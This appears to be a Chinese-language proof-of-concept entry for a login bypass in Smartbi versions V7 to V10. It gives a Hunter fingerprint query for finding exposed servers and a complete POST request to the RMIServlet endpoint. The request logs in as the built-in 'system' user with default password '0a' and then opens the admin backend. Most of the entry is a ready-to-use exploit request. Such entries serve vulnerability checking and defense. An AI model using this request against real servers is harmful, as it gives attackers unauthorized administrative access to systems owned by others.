# Smartbi内置用户登陆绕过漏洞

- **系统**：Smartbi　|　**类型**：其他　|　**CVE**：—
- **指纹**：`hunter：`app.name=="SMARTBI 思迈特"``
- **请求**：`POST /smartbi/vision/RMIServlet HTTP/1.1`

**请求体 / payload**
```
1. 访问POC出现如下情况则可能存在漏洞
/smartbi/vision/RMIServlet
2. 使用POST请求如下params：其中的第一个参数是内置的三个用户名（public、service、system）可随机构造绕过登录,第二个参数是三个账号默认的密文密码(默认值为0a),当响应如下，且`result`参数为`true`时表示存在漏洞。
Host: xx.xx.xx.xx
Content-Type: application/x-www-form-urlencoded
Cookie: JSESSIONID=B08E6669BFA8E9D85FB6BD98411C349C
Origin: https://smartbi.cy-sys.cn
Referer: https://smartbi.cy-sys.cn/smartbi/vision/RMIServlet
Sec-Fetch-User: ?1
Content-Length: 81
className=UserService&methodName=loginFromDB&params=["system","0a"]
3. 访问`https://xx.xx.xx.xx/smartbi/vision/index.jsp`成功进入后台
```

**其他**
- Smartbi内置用户登陆绕过漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * V7 <= Smartbi <= V10